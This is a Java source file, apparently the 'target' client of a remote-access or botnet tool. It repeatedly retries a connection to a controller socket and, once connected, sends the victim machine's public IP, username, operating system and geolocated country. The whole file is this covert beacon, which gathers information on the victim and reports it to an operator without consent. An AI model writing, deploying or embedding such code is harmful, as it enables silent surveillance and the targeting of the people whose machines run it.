package client;

import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.util.Scanner;

/**
 * The main class for the client (target)
 * Syntax: IP::USERNAME::OS::COUNTRYNAME
 */
public class Client {

    static String ip;
    static String username;
    static String os;
    static String country;
    static boolean isConnected;


    public static void main(String[] args) throws InterruptedException{
        while (!isConnected) {
            try {
                sendInfo();
                isConnected = true;
            } catch (IOException e){
                System.err.println("Retrying in 3");
                Thread.sleep(3000);  // Retry the connection every 3 seconds
            }
        }
    }


    public static boolean sendInfo() throws IOException{
        Socket conn = new Socket("0.0.0.0", 1234);
        PrintWriter pw = new PrintWriter(conn.getOutputStream(), true);
        pw.write(getInfo());
        return true;
    }

    public static String getInfo() throws IOException{
        ip = getWanIP();
        username = getLocalUname();
        os = getOs();
        country = getCountry();
        return new StringBuilder(ip).append("::"+username).append("::"+os).append("::"+country).toString();
    }

    private static String getWanIP() throws MalformedURLException, IOException{
        URL whatismyip = new URL("http://checkip.amazonaws.com");
        BufferedReader in = new BufferedReader(new InputStreamReader(
                whatismyip.openStream()));

        return in.readLine();
    }

    private static String getLocalUname() {
        return System.getProperty("user.name");
    }

    private static String getOs() {
        return System.getProperty("os.name");
    }

    private static String getCountry() {

        String result = null;
        String country = null;
        try {
            URL url = new URL("http://freegeoip.net/json/" + ip);  // `ip` should be set by the time this is called
            URLConnection connection = url.openConnection();
            InputStream response = connection.getInputStream();
            Scanner s = new Scanner(response).useDelimiter("\\A");
            result = s.next();

            JSONObject resultJson = new JSONObject(result);
            country = resultJson.get("country_name").toString();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return country;
    }

}
